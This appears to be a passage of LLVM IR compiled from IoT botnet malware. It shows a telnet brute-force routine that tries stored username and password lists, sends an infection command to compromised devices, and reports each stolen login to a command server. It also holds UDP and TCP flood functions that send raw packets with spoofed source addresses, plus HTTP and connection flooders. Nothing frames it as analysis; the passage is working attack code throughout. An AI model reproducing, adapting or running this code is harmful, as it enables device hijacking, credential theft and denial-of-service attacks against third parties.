  %232 = call i32 @sclose(i32 %231)
  store i8 0, i8* %34, align 8
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %233, align 1
  br label %377

; <label>:234:                                    ; preds = %226
  %235 = call i64 @strlen(i8* %227) #15
  %236 = trunc i64 %235 to i16
  store i16 %236, i16* %202, align 16
  %237 = load i32, i32* %192, align 4
  %238 = add i32 %237, 8
  %239 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %240 = icmp ult i32 %238, %239
  br i1 %240, label %241, label %377

; <label>:241:                                    ; preds = %234
  %242 = load i32, i32* %198, align 16
  %243 = call i32 @sclose(i32 %242)
  store i8 0, i8* %34, align 8
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %244, align 1
  br label %377

; <label>:245:                                    ; preds = %.lr.ph
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %247 = load i32, i32* %246, align 16
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i64
  %251 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %250
  %252 = load i8*, i8** %251, align 8
  %253 = call i64 @strlen(i8* %252) #15
  %254 = call i64 @send(i32 %247, i8* %252, i64 %253, i32 16384) #3
  %255 = icmp slt i64 %254, 0
  %256 = load i32, i32* %246, align 16
  br i1 %255, label %257, label %260

; <label>:257:                                    ; preds = %245
  %258 = call i32 @sclose(i32 %256)
  store i8 0, i8* %34, align 8
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %259, align 1
  br label %377

; <label>:260:                                    ; preds = %245
  %261 = call i64 @send(i32 %256, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384) #3
  %262 = icmp slt i64 %261, 0
  br i1 %262, label %263, label %267

; <label>:263:                                    ; preds = %260
  %264 = load i32, i32* %246, align 16
  %265 = call i32 @sclose(i32 %264)
  store i8 0, i8* %34, align 8
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %266, align 1
  br label %377

; <label>:267:                                    ; preds = %260
  store i8 6, i8* %34, align 8
  br label %377

; <label>:268:                                    ; preds = %.lr.ph
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %270 = load i32, i32* %269, align 4
  %271 = icmp eq i32 %270, 0
  br i1 %271, label %272, label %274

; <label>:272:                                    ; preds = %268
  %273 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %273, i32* %269, align 4
  br label %274

; <label>:274:                                    ; preds = %272, %268
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %276 = load i32, i32* %275, align 16
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %278 = load i8*, i8** %277, align 8
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  %280 = load i16, i16* %279, align 16
  %281 = zext i16 %280 to i32
  %282 = call i32 @readUntil(i32 %276, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %278, i32 1024, i32 %281)
  %283 = icmp eq i32 %282, 0
  br i1 %283, label %300, label %284

; <label>:284:                                    ; preds = %274
  store i32 0, i32* %269, align 4
  store i16 0, i16* %279, align 16
  %285 = load i8*, i8** %277, align 8
  %286 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #15
  %287 = icmp eq i8* %286, null
  br i1 %287, label %292, label %288

; <label>:288:                                    ; preds = %284
  call void @llvm.memset.p0i8.i64(i8* %285, i8 0, i64 1024, i32 1, i1 false)
  %289 = load i32, i32* %275, align 16
  %290 = call i32 @sclose(i32 %289)
  store i8 0, i8* %34, align 8
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 0, i8* %291, align 1
  br label %377

; <label>:292:                                    ; preds = %284
  %293 = call i32 @matchPrompt(i8* %285)
  %294 = icmp eq i32 %293, 0
  br i1 %294, label %295, label %299

; <label>:295:                                    ; preds = %292
  call void @llvm.memset.p0i8.i64(i8* %285, i8 0, i64 1024, i32 1, i1 false)
  %296 = load i32, i32* %275, align 16
  %297 = call i32 @sclose(i32 %296)
  store i8 0, i8* %34, align 8
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %298, align 1
  br label %377

; <label>:299:                                    ; preds = %292
  store i8 7, i8* %34, align 8
  call void @llvm.memset.p0i8.i64(i8* %285, i8 0, i64 1024, i32 1, i1 false)
  br label %377

; <label>:300:                                    ; preds = %274
  %301 = load i8*, i8** %277, align 8
  %302 = call i64 @strlen(i8* %301) #15
  %303 = trunc i64 %302 to i16
  store i16 %303, i16* %279, align 16
  %304 = load i32, i32* %269, align 4
  %305 = add i32 %304, 30
  %306 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %307 = icmp ult i32 %305, %306
  br i1 %307, label %308, label %377

; <label>:308:                                    ; preds = %300
  %309 = load i32, i32* %275, align 16
  %310 = call i32 @sclose(i32 %309)
  store i8 0, i8* %34, align 8
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %311, align 1
  br label %377

; <label>:312:                                    ; preds = %.lr.ph
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %314 = load i32, i32* %313, align 16
  %315 = call i64 @send(i32 %314, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i64 0, i64 0), i64 4, i32 16384) #3
  %316 = icmp slt i64 %315, 0
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %312
  %318 = load i32, i32* %313, align 16
  %319 = call i32 @sclose(i32 %318)
  store i8 0, i8* %34, align 8
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %320, align 1
  br label %377

; <label>:321:                                    ; preds = %312
  store i8 8, i8* %34, align 8
  br label %377

; <label>:322:                                    ; preds = %.lr.ph
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %324 = load i32, i32* %323, align 4
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %326, label %328

; <label>:326:                                    ; preds = %322
  %327 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %327, i32* %323, align 4
  br label %328

; <label>:328:                                    ; preds = %326, %322
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = load i8*, i8** @infectline, align 8
  %332 = call i64 @strlen(i8* %331) #15
  %333 = call i64 @send(i32 %330, i8* %331, i64 %332, i32 16384) #3
  %334 = icmp slt i64 %333, 0
  br i1 %334, label %335, label %341

; <label>:335:                                    ; preds = %328
  %336 = load i32, i32* %329, align 16
  %337 = call i32 @sclose(i32 %336)
  store i8 0, i8* %34, align 8
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %338, align 1
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %340 = load i8*, i8** %339, align 8
  call void @llvm.memset.p0i8.i64(i8* %340, i8 0, i64 1024, i32 1, i1 false)
  br label %377

; <label>:341:                                    ; preds = %328
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %344 = load i32, i32* %343, align 4
  %345 = call i8* @inet_ntoa(i32 %344) #3
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %347 = load i8, i8* %346, align 2
  %348 = zext i8 %347 to i64
  %349 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %348
  %350 = load i8*, i8** %349, align 8
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %352 = load i8, i8* %351, align 1
  %353 = zext i8 %352 to i64
  %354 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %353
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i64 0, i64 0), i8* %345, i8* %350, i8* %355)
  %357 = load i32, i32* %323, align 4
  %358 = add i32 %357, 8
  %359 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %360 = icmp ult i32 %358, %359
  br i1 %360, label %361, label %377

; <label>:361:                                    ; preds = %341
  %362 = load i32, i32* @mainCommSock, align 4
  %363 = load i32, i32* %343, align 4
  %364 = call i8* @inet_ntoa(i32 %363) #3
  %365 = load i8, i8* %346, align 2
  %366 = zext i8 %365 to i64
  %367 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %366
  %368 = load i8*, i8** %367, align 8
  %369 = load i8, i8* %351, align 1
  %370 = zext i8 %369 to i64
  %371 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %370
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 (i32, i8*, ...) @sockprintf(i32 %362, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i64 0, i64 0), i8* %364, i8* %368, i8* %372)
  %374 = load i32, i32* %329, align 16
  %375 = call i32 @sclose(i32 %374)
  store i8 0, i8* %34, align 8
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %376, align 1
  br label %377

; <label>:377:                                    ; preds = %.lr.ph, %190, %267, %321, %84, %81, %130, %125, %164, %156, %241, %234, %308, %300, %361, %341, %61, %335, %317, %299, %295, %288, %263, %257, %230, %207, %186, %180, %154, %114, %60
  %378 = add nsw i32 %.1163, 1
  %379 = icmp slt i32 %378, %11
  %.mux = select i1 %379, i32 %378, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %123

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %123, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #3
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %123, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %33 = call i32 @rand_cmwc()
  %34 = xor i32 %33, %32
  call void @srand(i32 %34) #3
  %35 = call i32 @rand() #3
  call void @init_rand(i32 %35)
  %36 = icmp eq i32 %31, 0
  br i1 %36, label %37, label %.preheader

; <label>:37:                                     ; preds = %.preheader
  %38 = sub nsw i32 32, %5
  %39 = shl i32 -1, %38
  %40 = sext i32 %3 to i64
  %41 = add nsw i64 %40, 28
  %42 = call i8* @llvm.stacksave()
  %43 = alloca i8, i64 %41, align 16
  %44 = bitcast i8* %43 to %struct.iphdr*
  %45 = getelementptr i8, i8* %43, i64 20
  %46 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @getRandomIP(i32 %39)
  %49 = call i32 @htonl(i32 %48) #18
  %50 = add nsw i64 %40, 8
  %51 = trunc i64 %50 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %44, i32 %47, i32 %49, i8 zeroext 17, i32 %51)
  %52 = trunc i64 %50 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #18
  %54 = getelementptr inbounds i8, i8* %43, i64 24
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 8
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = bitcast i8* %45 to i16*
  store i16 %57, i16* %58, align 4
  br i1 %10, label %59, label %61

; <label>:59:                                     ; preds = %37
  %60 = call i32 @rand_cmwc()
  br label %65

; <label>:61:                                     ; preds = %37
  %62 = trunc i32 %1 to i16
  %63 = call zeroext i16 @htons(i16 zeroext %62) #18
  %64 = zext i16 %63 to i32
  br label %65

; <label>:65:                                     ; preds = %61, %59
  %.pre-phi = phi i16 [ %62, %61 ], [ 0, %59 ]
  %66 = phi i32 [ %64, %61 ], [ %60, %59 ]
  %67 = trunc i32 %66 to i16
  %68 = getelementptr inbounds i8, i8* %43, i64 22
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  %70 = getelementptr inbounds i8, i8* %43, i64 26
  %71 = bitcast i8* %70 to i16*
  store i16 0, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %43, i64 28
  call void @makeRandomStr(i8* %72, i32 %3)
  %73 = bitcast i8* %43 to i16*
  %74 = getelementptr inbounds i8, i8* %43, i64 2
  %75 = bitcast i8* %74 to i16*
  %76 = load i16, i16* %75, align 2
  %77 = zext i16 %76 to i32
  %78 = call zeroext i16 @csum(i16* nonnull %73, i32 %77)
  %79 = getelementptr inbounds i8, i8* %43, i64 10
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  %81 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %82 = add nsw i32 %81, %2
  %83 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %84 = getelementptr inbounds i8, i8* %43, i64 4
  %85 = bitcast i8* %84 to i16*
  %86 = getelementptr inbounds i8, i8* %43, i64 12
  %87 = bitcast i8* %86 to i32*
  br i1 %10, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %65
  br label %.split

.split.us.preheader:                              ; preds = %65
  br label %.split.us

.split.us:                                        ; preds = %.split.us.backedge, %.split.us.preheader
  %.0.us = phi i32 [ 0, %.split.us.preheader ], [ %.0.us.be, %.split.us.backedge ]
  %88 = call i64 @sendto(i32 %25, i8* nonnull %43, i64 %41, i32 0, %struct.sockaddr* nonnull %83, i32 16) #3
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %58, align 4
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  store i16 %92, i16* %69, align 2
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  store i16 %94, i16* %85, align 4
  %95 = call i32 @getRandomIP(i32 %39)
  %96 = call i32 @htonl(i32 %95) #18
  store i32 %96, i32* %87, align 4
  %97 = load i16, i16* %75, align 2
  %98 = zext i16 %97 to i32
  %99 = call zeroext i16 @csum(i16* nonnull %73, i32 %98)
  store i16 %99, i16* %80, align 2
  %100 = icmp eq i32 %.0.us, %4
  br i1 %100, label %103, label %101

; <label>:101:                                    ; preds = %.split.us
  %102 = add i32 %.0.us, 1
  br label %.split.us.backedge

; <label>:103:                                    ; preds = %.split.us
  %104 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %105 = icmp sgt i32 %104, %82
  br i1 %105, label %.us-lcssa.us.loopexit, label %.split.us.backedge

.split.us.backedge:                               ; preds = %103, %101
  %.0.us.be = phi i32 [ %102, %101 ], [ 0, %103 ]
  br label %.split.us

.split:                                           ; preds = %.split.backedge, %.split.preheader
  %.0 = phi i32 [ 0, %.split.preheader ], [ %.0.be, %.split.backedge ]
  %106 = call i64 @sendto(i32 %25, i8* nonnull %43, i64 %41, i32 0, %struct.sockaddr* nonnull %83, i32 16) #3
  %107 = call i32 @rand_cmwc()
  %108 = trunc i32 %107 to i16
  store i16 %108, i16* %58, align 4
  %109 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #18
  store i16 %109, i16* %69, align 2
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  store i16 %111, i16* %85, align 4
  %112 = call i32 @getRandomIP(i32 %39)
  %113 = call i32 @htonl(i32 %112) #18
  store i32 %113, i32* %87, align 4
  %114 = load i16, i16* %75, align 2
  %115 = zext i16 %114 to i32
  %116 = call zeroext i16 @csum(i16* nonnull %73, i32 %115)
  store i16 %116, i16* %80, align 2
  %117 = icmp eq i32 %.0, %4
  br i1 %117, label %118, label %121

; <label>:118:                                    ; preds = %.split
  %119 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %120 = icmp sgt i32 %119, %82
  br i1 %120, label %.us-lcssa.us.loopexit45, label %.split.backedge

; <label>:121:                                    ; preds = %.split
  %122 = add i32 %.0, 1
  br label %.split.backedge

.split.backedge:                                  ; preds = %121, %118
  %.0.be = phi i32 [ %122, %121 ], [ 0, %118 ]
  br label %.split

.us-lcssa.us.loopexit:                            ; preds = %103
  br label %.us-lcssa.us

.us-lcssa.us.loopexit45:                          ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit45, %.us-lcssa.us.loopexit
  call void @llvm.stackrestore(i8* %42)
  br label %123

; <label>:123:                                    ; preds = %22, %17, %27, %.us-lcssa.us
  ret void
}

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = add nsw i32 %9, %4
  %11 = icmp sgt i32 %5, 0
  br i1 %11, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %12 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %15

; <label>:13:                                     ; preds = %15
  %14 = icmp slt i32 %24, %5
  br i1 %14, label %15, label %._crit_edge16.loopexit

; <label>:15:                                     ; preds = %.lr.ph15, %13
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %24, %13 ]
  %16 = tail call i32 @rand() #3
  %17 = srem i32 %16, 36
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %12, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %20) #3
  %22 = tail call i32 @fork() #3
  %23 = icmp eq i32 %22, 0
  %24 = add nuw nsw i32 %.013, 1
  br i1 %23, label %13, label %.preheader

.preheader:                                       ; preds = %15
  %25 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %26 = icmp sgt i32 %10, %25
  br i1 %26, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %27 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %28

; <label>:28:                                     ; preds = %.lr.ph, %.backedge
  %29 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %.backedge, label %31

; <label>:31:                                     ; preds = %28
  %32 = call i64 @strlen(i8* nonnull %12) #15
  %33 = call i64 @write(i32 %29, i8* nonnull %12, i64 %32) #3
  %34 = call i64 @read(i32 %29, i8* nonnull %27, i64 1) #3
  %35 = tail call i32 @close(i32 %29) #3
  br label %.backedge

.backedge:                                        ; preds = %31, %28
  %36 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %10, %36
  br i1 %37, label %28, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #17
  unreachable

._crit_edge16.loopexit:                           ; preds = %13
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %142

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %142, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #3
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %142, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #18
  %47 = add i32 %4, 20
